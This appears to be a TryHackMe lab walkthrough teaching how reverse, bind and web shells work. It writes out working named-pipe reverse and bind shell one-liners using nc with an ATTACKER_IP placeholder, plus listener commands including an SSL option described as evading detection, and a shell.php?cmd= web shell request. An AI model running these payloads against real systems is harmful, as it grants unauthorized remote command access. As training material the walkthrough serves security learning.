# **TryHackMe Walkthrough: Understanding Reverse, Bind & Web Shells**

---

## **Part 1: How Reverse Shells Work**

In a reverse shell scenario, the attacker sets up a listener on their machine, and the target machine connects *back* to the attacker. This is often used to bypass inbound firewall rules.

### **1. Setting Up the Listener (Attacker Machine)**
To receive a reverse shell connection, the attacker must set up a listener to wait for the target to connect back to them. This is typically done using Netcat (`nc`).

*   **Command:** 
    ```bash
    nc -lvnp 443
    ```

**Command Breakdown:**
*   **`-l`**: Tells Netcat to **listen** (wait) for an incoming connection.
*   **`-v`**: Enables **verbose** mode to provide detailed connection output.
*   **`-n`**: Prevents **DNS resolution**, forcing the connection to use IP addresses instead of hostnames.
*   **`-p 443`**: Specifies the **port** to listen on. 

> **Note:** Attackers often use common ports (such as 53, 80, 443, 139, or 445) to blend in with legitimate network traffic and bypass security appliances.

---

### **2. Executing the Payload (Compromised Target Machine)**
Once the listener is active, a reverse shell payload must be executed on the target system. This payload abuses a vulnerability to expose the system's shell over the network. A common example is the **pipe reverse shell**.

*   **Command:** 
    ```bash
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
    ```

**Command Breakdown:**
*   **`rm -f /tmp/f`**: Removes any existing named pipe at that location to ensure a fresh pipe can be created without conflicts.
*   **`mkfifo /tmp/f`**: Creates a named pipe (FIFO), acting as a conduit for bi-directional communication.
*   **`cat /tmp/f`**: Reads data (input) from the named pipe.
*   **`| sh -i 2>&1`** (or `bash -i`): Pipes the output from `cat` into an interactive shell instance. The `2>&1` portion redirects standard error to standard output so the attacker can see error messages.
*   **`| nc ATTACKER_IP ATTACKER_PORT`**: Pipes the shell's output through Netcat directly back to the attacker's listening IP and port.
*   **`>/tmp/f`**: Sends the final output back into the named pipe, completing the loop and allowing for continuous, two-way communication. 

Once executed, the attacker's terminal will show a successful connection from the target's IP, granting them interactive command-line access to the compromised machine.

---
---

## **Part 2: How Bind Shells Work**

In a bind shell scenario, the compromised target machine opens a port and waits (listens) for an incoming connection. The attacker then connects directly to that exposed port.

### **1. Setting Up the Bind Shell (Compromised Target Machine)**
The target machine must execute a payload that opens a port and binds a shell to it.

*   **Command:** 
    ```bash
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
    ```

**Command Breakdown:**
*   **`rm -f /tmp/f`**: Removes any existing named pipe at `/tmp/f` to ensure a new one can be created without conflicts.
*   **`mkfifo /tmp/f`**: Creates a named pipe (FIFO) to act as a conduit for two-way communication between processes.
*   **`cat /tmp/f`**: Reads data (input) from the named pipe.
*   **`| bash -i 2>&1`**: Pipes the output of `cat` into an interactive bash shell (`bash -i`). The `2>&1` redirects standard error to standard output so the attacker receives error messages.
*   **`| nc -l 0.0.0.0 8080`**: Starts Netcat in listen mode (`-l`) on all network interfaces (`0.0.0.0`) on port `8080`. This exposes the shell to the network.
*   **`> /tmp/f`**: Sends the output of the executed commands back into the named pipe, completing the loop for bidirectional communication.

> **Note:** Ports below 1024 usually require elevated (root/administrator) privileges to bind to. Using a higher port like `8080` avoids this restriction.

---

### **2. Connecting to the Bind Shell (Attacker Machine)**
Once the target machine is actively listening, the attacker uses Netcat to reach out and establish the connection to the exposed shell.

*   **Command:** 
    ```bash
    nc -nv TARGET_IP 8080
    ```

**Command Breakdown:**
*   **`nc`**: Invokes Netcat to establish the connection.
*   **`-n`**: Disables DNS resolution, making the connection faster and preventing unnecessary network lookups.
*   **`-v`**: Enables verbose mode to provide detailed output about the connection process.
*   **`TARGET_IP`**: The IP address of the compromised lab machine hosting the bind shell.
*   **`8080`**: The specific port number the target is listening on.

Once this command is executed, the attacker will be connected to the target and granted interactive access to execute commands on the system.

---
---

## **Part 3: Advanced Listener Tools**

While traditional Netcat (`nc`) is the standard tool for catching shells, there are other utilities that offer enhanced functionality, such as command history, better stability, and encryption.

### **1. Rlwrap**
`rlwrap` is a small utility that uses the GNU readline library to wrap another command (like Netcat). It significantly improves interaction by enabling keyboard arrow keys and command history editing.
*   **Command:** 
    ```bash
    rlwrap nc -lvnp 443
    ```

### **2. Ncat**
Distributed by the NMAP project, `Ncat` is an upgraded version of Netcat that includes advanced features like SSL encryption.
*   **Standard Listener Command:** 
    ```bash
    ncat -lvnp 4444
    ```
*   **Encrypted (SSL) Listener Command:** 
    ```bash
    ncat --ssl -lvnp 4444
    ```
    *The `--ssl` flag ensures the reverse shell connection is encrypted, which helps evade network-level detection.*

### **3. Socat**
`Socat` is a versatile utility used to create socket connections between two different data sources (or hosts). It is highly regarded in penetration testing for providing fully interactive and stable shells.
*   **Command:** 
    ```bash
    socat -d -d TCP-LISTEN:443 STDOUT
    ```
*   **Command Breakdown:**
    *   **`-d -d`**: Enables double verbosity to provide detailed connection logs.
    *   **`TCP-LISTEN:443`**: Sets up a TCP server socket listening on port 443 for incoming connections.
    *   **`STDOUT`**: Directs all incoming data directly to the terminal's standard output.

---
---

## **Part 4: Web Shells**

A web shell is a malicious script written in a language supported by a compromised web server (such as PHP, ASP, JSP, or CGI). Once deployed, it acts as a backdoor, allowing an attacker to execute commands directly on the server through web requests. Because they operate over standard web protocols (like HTTP/HTTPS), they are popular for blending in with normal traffic and evading detection.

### **Deployment & Execution**
Web shells are typically dropped onto a server by exploiting vulnerabilities like Unrestricted File Uploads, File Inclusion, or Command Injection. 

Once a shell (e.g., `shell.php`) is hosted on the server, an attacker can interact with it by passing commands through URL parameters. For example, if the script is designed to capture a GET request parameter named `cmd` and pass it to a system execution function, the attacker could navigate to:
`http://victim.com/uploads/shell.php?cmd=whoami`

The server processes the PHP, executes the `whoami` command at the OS level, and returns the output directly to the attacker's web browser.

### **Popular Web Shells Available Online**
Because web servers support robust scripting languages, web shells can range from basic one-liners to complex, feature-rich administration panels. Some well-known examples include:
*   **p0wny-shell:** A minimalistic, single-file PHP web shell designed for simple remote command execution.
*   **b374k shell:** A highly feature-rich PHP shell that includes comprehensive file management and command execution capabilities.
*   **c99 shell:** One of the most historically well-known and robust PHP web shells, containing extensive administrative and exploitation functionalities.
